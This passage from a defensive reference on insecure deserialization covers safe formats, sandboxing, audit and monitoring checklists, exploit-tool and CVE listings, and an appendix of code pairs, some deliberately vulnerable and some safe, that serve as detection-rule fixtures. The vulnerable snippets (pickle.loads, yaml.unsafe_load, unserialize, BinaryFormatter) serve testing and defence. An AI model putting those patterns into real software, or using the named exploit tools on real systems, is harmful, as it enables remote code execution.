| `pydantic.BaseModel.parse_raw(tool_output)` | **Safe**: schema-enforced; rejects unknown fields with `extra="forbid"`; validates types |
| `pickle.loads(tool_output)` or `cloudpickle.loads` | **Critical RCE**: appears in distributed-agent frameworks for "object passing" between worker processes |
| `eval(...)` / `exec(...)` of LLM-emitted code | Out of scope for deserialization but same trust-boundary failure |
| YAML.load on agent state checkpoints | **Critical** if `unsafe_load`; safe with `safe_load` and `permitted_classes=[]` |

**Pydantic as a defensive primitive.** Pydantic v2's `BaseModel` with `model_config =
ConfigDict(extra="forbid", strict=True)` provides exactly the property that pickle / Marshal
lack: **declared structure, validated types, no constructor side effects.** Pydantic AI
(`ai.pydantic.dev`) builds on this for typed tool I/O — tool arguments and outputs are
validated against `BaseModel` schemas, and validation errors are surfaced back to the LLM for
self-correction. The validation is the *only* untrusted-input-side semantic; the model
constructor doesn't execute reflection or class instantiation from input strings. This is the
"safe format" property from §11's mitigation hierarchy ("Use a safe format (Protocol Buffers,
MessagePack, Avro) with no type discrimination") applied to LLM agent I/O.

**Operational guidance:**
- Audit every `tool_output` parse path in an agent for `pickle` / `cloudpickle` / `yaml.load`.
- Prefer Pydantic `BaseModel.model_validate_json(raw)` with `extra="forbid"` for tool I/O.
- For agent state checkpointing, use JSON with a Pydantic schema, not pickle.
- For multi-process agent IPC, prefer message-bus formats (Protocol Buffers, MessagePack) over
  `multiprocessing.Queue`-default pickling.
- For sandboxed code-execution tools, the sandbox must isolate the deserializer (gVisor /
  Firecracker / no-fs no-net containers) — the host's `pickle.loads` of the sandbox's output
  is a bypass otherwise.

Cross-link: `llm_agent_security_expertise.md` for the broader agent-runtime threat model;
this section is the deserialization slice specifically.

Sources: `ai.pydantic.dev/`, Pydantic v2 docs on `model_config`, Real Python "Building
Type-Safe LLM Agents With Pydantic AI" tutorial corpus.

### Modern defensive primitives: deserialize-safe formats

The "safe format" mitigation has matured into a small portfolio of well-audited deserialize-safe
formats by 2026. Selection criteria, in order: (1) schema is declared out-of-band, not in the
payload; (2) parser is memory-safe; (3) no type-instantiation primitive from payload contents;
(4) parser performance is bounded and DoS-resistant.

| Format | Author/Steward | Safe-for-untrusted | Notes |
|---|---|---|---|
| **safetensors** | Hugging Face / Trail of Bits audit 2023 | Yes (tensor data only) | Rust impl; length-prefixed; ML-weights only. Default for HF; joined the PyTorch Foundation 2026-04. |
| **Protocol Buffers** | Google | Yes with caveats | Schema out-of-band; no type discrimination by default. Caveat: `Any` type re-introduces type-info-in-payload (use carefully). gRPC integrates. |
| **FlatBuffers** | Google | Yes | Zero-copy; even safer than protobuf because parsing is pointer-arithmetic over validated offsets — no allocator pressure, no constructor side effects. |
| **Cap'n Proto** | Sandstorm / Kenton Varda | Yes | Similar to FlatBuffers; arena allocator; explicit "no calls during deserialization" design goal. |
| **Apache Arrow** | Apache | Yes (columnar data only) | Memory-mapped tabular format; data-only by design. |
| **MessagePack** (without `ext` types) | Sadayuki Furuhashi | Yes for primitive/array/map | The `ext` type is a footgun if used for custom-class hooks. Stick to primitives. |
| **JSON + JSON Schema** | RFC 8259 + Pydantic / Ajv / etc. | Yes with strict validation | Browser-grade safety provided schema enforcement is strict; `extra="forbid"`-equivalent is required. |
| **TOML** | Tom Preston-Werner | Yes | Config-only; no type-instantiation primitive. |
| **dhall / jsonnet** | dhall-lang / Google | Yes (with sandbox) | Configuration-language ecosystems; intentional design goal is no side effects during eval. dhall's totality + sandbox is the strongest of the bunch. |

**Sandboxing the deserializer.** When pickle / Marshal / BinaryFormatter is unavoidable
(legacy compat, hardcoded vendor format), sandbox the deserialization itself:

- **gVisor / Firecracker microVMs**: kernel-namespace + seccomp containment for the
  deserializer process; the host receives only the validated output structure.
- **WebAssembly runtimes** (Wasmer / Wasmtime / WasmEdge): deserialize inside a Wasm sandbox
  with no host syscall access. The Wasm host then validates and re-serializes the output via
  a schema-enforced format.
- **Deno permissions model**: `--allow-read=/specific/path --allow-net=none` constrains a JS
  deserializer's blast radius. Useful for `JSON.parse + reviver` deserialization with custom
  hooks.

The pattern: **untrusted bytes → sandbox → schema-validated bytes → host process**. The host
never directly deserializes untrusted input; it only consumes the sandbox's pre-validated
output. This is the deserialization analogue of running parsers in a privilege-separated
process à la Postfix or OpenSSH.

### Audit all deserialization entry points, not just the obvious ones

From Frohoff's property bag research extended to deserialization: enumerate the full surface.
Check for:
- JRMP ports (Java RMI): `nmap -p 1099,1098` and service fingerprinting
- JMX (1099, 9999, custom): require authentication + TLS
- T3/T3S (WebLogic): deserialization endpoint, restrict via connection filters
- AMF endpoints (BlazeDS): any `/messagebroker/amf` path
- Hessian/Burlap RPC endpoints: any `/remoting/` or `/hessian/` paths
- `.NET Remoting` HTTP endpoints: `tcp.remoting`, `/RemotingService`
- ViewState endpoints: check for `__VIEWSTATE` parameter with known or guessable MachineKey
- **ML pickle artifacts (2024+):** `torch.load` / `joblib.load` / Keras `Lambda` layers /
  MLflow `pyfunc` flavor / `transformers.from_pretrained(trust_remote_code=True)` over any
  user-influenced model ID
- **Agent tool-output parse paths:** `pickle.loads` / `cloudpickle.loads` / `yaml.unsafe_load`
  on LLM tool returns or sub-agent IPC

### Monitor for deserialization exploitation patterns

- **Java URLDNS probe:** Unexpected DNS lookups from application servers with entropy-rich subdomains (OAST pattern)
- **JShell API invocations** in process trees (more stealthy than `Runtime.exec()` in modern JDK)
- **Unusual outbound connections** from application servers (to port 1099, 389, 636 from a web process)
- **.NET BinaryFormatter usage:** Any `BinaryFormatter.Deserialize()` invocation in production code is a red flag regardless of input source

---

## 12. Tooling Reference

| Tool | Author | Platform | Purpose |
|------|--------|---------|---------|
| **ysoserial** | Chris Frohoff | Java | Generate Java deserialization payloads from named gadget chains |
| **ysoserial.net** | Alvaro Muñoz + Soroush Dalili | .NET | Generate .NET deserialization payloads (BinaryFormatter, Json.Net, ViewState, etc.) |
| **marshalsec** | Moritz Bechler | Java | Generate payloads for 13+ Java marshallers; includes LDAP/RMI reference servers |
| **LDAP Swiss Army Knife** | Moritz Bechler / SySS | Network | LDAP server for JNDI injection testing; intercepts credentials; delivers Reference/serialized objects |
| **beanshooter** | Tobias Neitzel / CODE WHITE | Java | JMX exploitation including StandardMBean+TemplatesImpl and RequiredModelMBean techniques |
| **HttpRemotingObjRefLeak** | CODE WHITE | .NET | Exploit toolkit for CVE-2024-29059; automated ObjRef leaking + exploitation |
| **NewRemotingTricks** | CODE WHITE | .NET | PoC for three CAS-bypass .NET Remoting techniques (2024) |
| **ExploitRemotingService** | James Forshaw (fork by Wulftange) | .NET | .NET Remoting exploitation with `--useobjref`, `--uselease`, `--useser` modes |
| **phpggc** | Ambionics Security | PHP | PHP gadget chain generator; analog of ysoserial for PHP frameworks |
| **CodeQL + taint tracking** | GitHub / Muñoz | Multi | Systematic deserialization sink discovery in large codebases |
| **picklescan** | M. Maître (community) | Python/ML | Pickle-opcode scanner for ML model files; **multiple bypass CVEs in 2025** (see §9), use only as defense-in-depth alongside safetensors migration |
| **ModelAudit** | Promptfoo | Python/ML | Open-source ML-model security scanner; reads safetensors as the safe path, scans pickle for known-bad opcodes/imports |
| **ProtectAI Guardian** | ProtectAI / HF partnership | Python/ML | Commercial ML model scanner; HF integration since 2024-10; scanned 4.47M model versions / 352,000 unsafe or suspicious issues across 51,700 models as of 2025-04 |
| **Brakeman `UnsafeDeserialize`** | presidentbeef (Justin Collins) | Ruby/Rails | Static-analysis warning class for `Marshal.load`, `YAML.load`, `Oj.load` in Rails application code |
| **GitHubSecurityLab/ruby-unsafe-deserialization** | Peter Stöckli (GHSL) | Ruby | PoC corpus covering Marshal / YAML / JSON / XML deserialization in modern Ruby |

---

## 13. CVE Reference by Researcher

### Chris Frohoff (via ysoserial gadget chains)
- **CVE-2015-6420** (Apache Commons Collections deserialization)
- **CVE-2015-7501** (JBoss / Apache Commons)
- ysoserial gadget chains are cited in 50+ product-specific CVEs (WebLogic, WebSphere, JBoss, Jenkins, etc.)

### Alvaro Muñoz + Oleksandr Mirosh
- **CVE-2017-9424** — Breeze framework (.NET)
- **CVE-2017-9785** — NancyFX (.NET)
- **CVE-2017-9822** — DotNetNuke (.NET)
- **CVE-2017-8565** — PSObject gadget, Windows PowerShell
- **CVE-2022-42889** — Apache Commons Text ("Text4Shell")
- **CVE-2020-9496** — Apache OFBiz pre-auth XMLRPC deserialization
- **CVE-2021-30179 et al.** — Apache Dubbo multiple pre-auth RCE
- **CVE-2021-36162/36163** — Apache Dubbo YAML + Hessian deserialization
- Multiple OGNL/Struts CVEs: CVE-2016-3087, CVE-2016-4436, CVE-2018-1327,
  CVE-2020-17530

### Markus Wulftange
- **RF-14310 / RF-14309** — RichFaces 3.x/4.x EL injection bypass
- **CVE-2019-18935** — Telerik UI for ASP.NET AJAX (RadAsyncUpload) deserialization
- **CVE-2020-7961** — Liferay Portal pre-auth JSON RCE
- **CVE-2022-23277** — Microsoft Exchange serialization binder bypass
- **CVE-2022-28684** — DevExpress SafeSerializationBinder bypass
- **CVE-2023-35813** — Sitecore ASP.NET TemplateParser RCE (CVSS 9.8)
- **CVE-2023-33160** — SharePoint ASP.NET TemplateParser RCE
- **CVE-2024-29059** — .NET HTTP Remoting ObjRef leak → RCE
- **CVE-2025-59287** — Microsoft WSUS SoapFormatter unauthenticated RCE (CVSS 9.8, CISA KEV)

### Moritz Bechler
- **CVE-2016-9606** — JBoss Resteasy / SnakeYAML
- **CVE-2016-8749 / CVE-2017-3159** — Apache Camel / Jackson + SnakeYAML
- **CVE-2017-2608** — Jenkins / XStream
- **CVE-2017-5641 / CVE-2017-3066** — BlazeDS / Adobe ColdFusion AMF
- **CVE-2016-5229** — Atlassian Bamboo / XStream
- **CVE-2018-2800** — Java JRMP HTTP tunneling SSRF deserialization
- **CVE-2018-3149** — Java JNDI LDAP codebase loading restriction (analysis of fix)
- C3P0 gadget contribution to ysoserial

### Modern-era contributors (2024-2026)

**JFrog Security Research (PickleScan cluster):**
- **CVE-2025-1716** — PickleScan `pip.main` unsafe-globals omission (reported by Sonatype; CVSS 4.0 5.3)
- **CVE-2025-10155** — PickleScan extension-mismatch bypass (CVSS 9.3)
- **CVE-2025-10156** — PickleScan ZIP CRC bypass (CVSS 9.3)
- **CVE-2025-10157** — PickleScan submodule-import bypass (CVSS 9.3)

**Viettel Cyber Security / ZDI / Pwn2Own Berlin 2025 (SharePoint ToolShell):**
- **CVE-2025-49704** — SharePoint XML deserialization RCE via `ExcelDataSet.CompressedDataTable` (CVSS 8.8)
- **CVE-2025-49706** — SharePoint `PostAuthenticateRequestHandler` Referer auth bypass
- **CVE-2025-53770** — Wild-exploit variant of CVE-2025-49704 (CVSS 9.8, CISA KEV)
- **CVE-2025-53771** — Wild-exploit variant of CVE-2025-49706

**Apache Struts2 OGNL mass-assignment lineage (Dynatrace / EQSTLab analysis):**
- **CVE-2024-53677** — Struts2 file-upload `top.fileFileName` OGNL mass-assignment path traversal RCE (CVSS 9.5)

**Luke Jahnke / Peter Stöckli (Ruby deserialization 2024):**
- **Ruby 3.4 universal Marshal gadget chain** (Jahnke, 2024-11-24; patched)
- **`Gem::SafeMarshal` escape** (Jahnke, 2024-12-03; patched)
- **`ruby-unsafe-deserialization` PoC corpus** (Stöckli / GHSL, 2024-06)

**HiddenLayer Research (Hugging Face supply chain):**
- **"Silent Sabotage"** — safetensors-conversion bot pickle execution (2024)
- **OpenAI Privacy Filter impersonation campaign** — 244k-download infostealer corpus (2026)

### JavaScript / Node.js
- **CVE-2017-5941** — `node-serialize` `unserialize()` `_$$ND_FUNC$$_` IIFE RCE (CVSS 9.8, no fix)
- **CVE-2017-5954** — `serialize-to-js` deserialization RCE (same revive-a-function class)
- Prototype-pollution-bridged RCE corpus — see `prototype_pollution_expertise.md` CVE list

---

## 14. Summary: What Defines Staff-Level Deserialization Expertise

1. **Format-agnostic mindset.** Deserialization vulnerabilities are not specific to Java
   `ObjectInputStream`. Every format that includes type information in untrusted data — YAML,
   JSON, XML, AMF, Hessian, .NET BinaryFormatter — is in scope. The vulnerability is
   architectural; the format is incidental.

2. **Gadget chain thinking.** Finding a deserialization sink is step one. Steps two through five
   are identifying the classpath/assembly surface, tracing trigger methods through collection
   reconstruction, and chaining to a dangerous terminal primitive. A sink without gadgets is
   unexploitable; gadgets on the classpath without a sink are inert. Both matter.

3. **JDK-only gadgets are the ceiling.** The most powerful gadgets require no third-party
   libraries — `Jdk7u21` (Frohoff), `JdbcRowSetImpl` (Muñoz/Mirosh), SnakeYAML URL classloader
   (Bechler). Any JVM or .NET runtime is potentially exploitable without unusual classpath
   dependencies.

4. **Patch tracking matters.** JNDI codebase loading has been patched twice (Java 8u121, 8u191).
   JEP 290 filters were bypassed via the client-side deserialization path. Modern JDK reflection
   restrictions broke multiple gadgets but JShell provides a replacement execution primitive.
   Knowing what was patched, when, and what still works is operationally essential.

5. **Mitigation hierarchy:** (1) Don't deserialize untrusted data [architectural]; (2) Use
   allowlist filters, not blacklists [JEP 290, custom binders — but binders are bypassable];
   (3) Authenticate and sign serialized blobs; (4) Defense in depth (serialization filters,
   TLS on RMI/JMX, egress filtering to prevent JNDI callbacks). The first option is always
   the most reliable.

6. **The attacker's advantage compounds over time.** Frohoff's 2015 talk was mostly ignored for
   10 months. The exact JNDI injection technique from Muñoz's 2016 Black Hat talk was deployed at
   internet scale as Log4Shell in 2021. Research published quietly becomes a mass-exploitation
   tool when the right vulnerability arises. Staff-level defenders should track this research in
   near-real-time, not post-incident.

7. **The ML supply chain has industrialized pickle.** Pre-2023, `pickle.loads(untrusted)` was a
   niche RPC sink. As of 2026 it is a mass-volume attack surface via PyTorch / Hugging Face /
   joblib / Keras Lambda layers, with monthly download counts in the hundreds of millions. Static
   scanners (PickleScan, ProtectAI) form a blacklist arms race and have been bypassed
   repeatedly (Sonatype's CVE-2025-1716; JFrog's CVE-2025-10155 / -10156 / -10157 cluster). The architectural fix
   is **safetensors plus signed-and-attested model provenance**, not "scan harder." The
   pre-existing Jackson-blacklist lesson applies one-for-one.

8. **AI agents extend the surface to tool-output parse paths.** Any place an LLM agent calls
   `pickle.loads` / `cloudpickle.loads` / `yaml.unsafe_load` on a tool return or sub-agent
   message is a deserialization sink with the agent loop as the entry point. Pydantic
   `BaseModel` with `extra="forbid"` is the defensive primitive — schema-validated, no
   constructor side effects, errors flow back to the LLM for self-correction. Cross-reference
   `llm_agent_security_expertise.md`.

9. **Modern post-2024 .NET deserialization is still BinaryFormatter-equivalent.** CVE-2025-49704
   SharePoint ToolShell (BinaryFormatter via `ExcelDataSet.CompressedDataTable`) and
   CVE-2025-59287 WSUS (SoapFormatter) demonstrate that the formatter taxonomy from §5 holds at
   internet scale a decade after BinaryFormatter was first flagged as critical. MachineKey
   rotation as part of remediation is non-negotiable — the patch alone leaves the ViewState-
   forgery backdoor live (same lesson as CVE-2020-0688 Exchange).

---

## Appendix A: Reference Corpus (toy vuln/safe pairs for regression tests)

Minimal, self-contained pairs for building and regression-testing detection rules. Each pair is a
**vuln** case (a rule SHOULD fire) and a **safe** counterpart (a rule MUST NOT fire — these are the
precision anchors that catch over-broad patterns). Kept deliberately tiny so they double as
fixtures. The safe cases encode the false-positive boundaries called out in the body sections
above (allowlists, safe constructors, fixed destination types, signed blobs).

### Java — ObjectInputStream

```java
// VULN: untrusted bytes → readObject(), no filter
Object o = new ObjectInputStream(request.getInputStream()).readObject();   // SHOULD FIRE

// SAFE: JEP 290 allowlist filter installed before readObject()
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter("com.example.Dto;!*"));
Object o2 = ois.readObject();                                              // MUST NOT FIRE
```

### Java — SnakeYAML (note the 1.x vs 2.0 boundary from §3)

```java
// VULN: default Constructor on SnakeYAML 1.x; or 2.0 with global tags re-enabled
Object o = new Yaml().load(userInput);                                     // SHOULD FIRE (1.x)
LoaderOptions opts = new LoaderOptions();
opts.setTagInspector(tag -> true);                                         // re-opens global tags
Object o2 = new Yaml(new Constructor(opts)).load(userInput);               // SHOULD FIRE (2.0)

// SAFE: SafeConstructor, or 2.0 default (global tags blocked)
Object s = new Yaml(new SafeConstructor(new LoaderOptions())).load(userInput); // MUST NOT FIRE
```

### Java — Jackson polymorphic typing

```java
// VULN: default typing / Id.CLASS over untrusted input
ObjectMapper m = new ObjectMapper();
m.activateDefaultTyping(LaissezFaireSubTypeValidator.instance);            // SHOULD FIRE
Object o = m.readValue(userJson, Object.class);

// SAFE: no polymorphic typing, fixed destination type
Dto dto = new ObjectMapper().readValue(userJson, Dto.class);               // MUST NOT FIRE
```

### Python — pickle / yaml / torch

```python
# VULN
obj = pickle.loads(request.data)                       # SHOULD FIRE
cfg = yaml.load(request.data, Loader=yaml.Loader)      # SHOULD FIRE (UnsafeLoader/Loader = RCE)
cfg = yaml.unsafe_load(request.data)                   # SHOULD FIRE
cfg = yaml.load(request.data)                          # SHOULD FIRE (bare load: deprecated; defaults
                                                       #   to FullLoader since pyyaml 5.1, which still
                                                       #   has RCE-bypass history — CVE-2020-1747/14343)
model = torch.load(untrusted_path)                     # SHOULD FIRE (weights_only defaults False pre-2.6)

# SAFE
data = json.loads(request.data)                        # MUST NOT FIRE
cfg2 = yaml.safe_load(request.data)                    # MUST NOT FIRE
model2 = torch.load(untrusted_path, weights_only=True) # MUST NOT FIRE (risk-reduced; see §9 caveat)
```

### PHP — unserialize / phar

```php
// VULN
$o = unserialize($_POST['data']);                      // SHOULD FIRE
$x = file_exists("phar://" . $_GET['f']);              // SHOULD FIRE (phar:// metadata deserialization)

// SAFE
$o = json_decode($_POST['data'], true);                // MUST NOT FIRE
$o = unserialize($_POST['data'], ['allowed_classes' => false]); // MUST NOT FIRE (no object instantiation)
```

### Ruby — Marshal / YAML

```ruby
# VULN
obj = Marshal.load(params[:data])                      # SHOULD FIRE
obj = YAML.unsafe_load(params[:data])                  # SHOULD FIRE

# SAFE
obj = JSON.parse(params[:data])                        # MUST NOT FIRE
obj = YAML.safe_load(params[:data], permitted_classes: []) # MUST NOT FIRE
```

### .NET — BinaryFormatter / Json.NET

```csharp
// VULN
var o = new BinaryFormatter().Deserialize(stream);     // SHOULD FIRE (deprecated/removed in .NET 9)
var s = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };
var o2 = JsonConvert.DeserializeObject<object>(json, s); // SHOULD FIRE

// SAFE
var dto = JsonConvert.DeserializeObject<Dto>(json);    // MUST NOT FIRE (TypeNameHandling None by default)
var dto2 = JsonSerializer.Deserialize<Dto>(json);      // MUST NOT FIRE (System.Text.Json, no type-from-payload)
```

### JavaScript / Node — node-serialize

```js
// VULN
const o = require('node-serialize').unserialize(req.body.data);  // SHOULD FIRE

// SAFE
const o = JSON.parse(req.body.data);                             // MUST NOT FIRE (no function revival)
```

**Corpus discipline note:** the safe cases matter more than the vuln cases for rule precision. A
rule that fires on every `new Yaml()` regardless of constructor argument, every `torch.load`
regardless of `weights_only`, or every Jackson `readValue` regardless of typing config will be
noisy and get disabled. Pin each safe case as a `# ok:` / negative test annotation. Cross-check
against `FINDING_ACTIONABILITY_TRIAGE.md` for the reachability/trusted-source dimensions that these
syntactic fixtures don't capture.
